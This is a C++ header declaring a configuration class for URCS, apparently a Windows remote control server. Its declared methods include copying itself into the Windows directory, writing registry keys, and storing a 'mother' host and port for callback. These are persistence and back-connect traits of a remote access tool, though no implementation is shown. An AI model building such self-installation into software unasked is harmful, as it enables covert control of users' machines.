/*
All CopyRights Reserved.
Created by unmanarc.com. emailme to: unma@unmanarc.com
this source are under GNU/GPL (General Public Licence)
http://urcs.unmanarc.com/
http://urcs.sourceforge.net/

by unmanarc.
thanks to all.
enjoy ;)
*/
#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

class Cini
{
public:
	Cini(); 
	
	~Cini();
	void LoadData(); // Load data from ini and system
	BOOL PutData(LPCTSTR appname,LPCTSTR keyname,LPCTSTR stringname); //put data in ini file
	int ValidateUser(char *username, char *pass); //with MD5 inifile validation
	BOOL PutKey( HKEY base, LPCSTR path, LPCSTR valuename, LPCSTR value );
	void CopyMeToWinDir();
	s_proxyinf GetProxy();

	//Datos del ini:
	
	char server_prompt[256];
	char server_banner[256];
	char server_name[256];
	char mother_name[256];
	
	int mport;
	int port;
	BOOL log_data;
	BOOL crypted;

	//Datos del sistema:
	
	char lcname[_MAX_PATH];
	char lcfn[_MAX_PATH];
	char windir[_MAX_PATH];
	char sysdir[_MAX_PATH];
	BOOL nt;
	BOOL installed;
	
protected:
	char ini_filename[256];
	char mother_port[256];

};
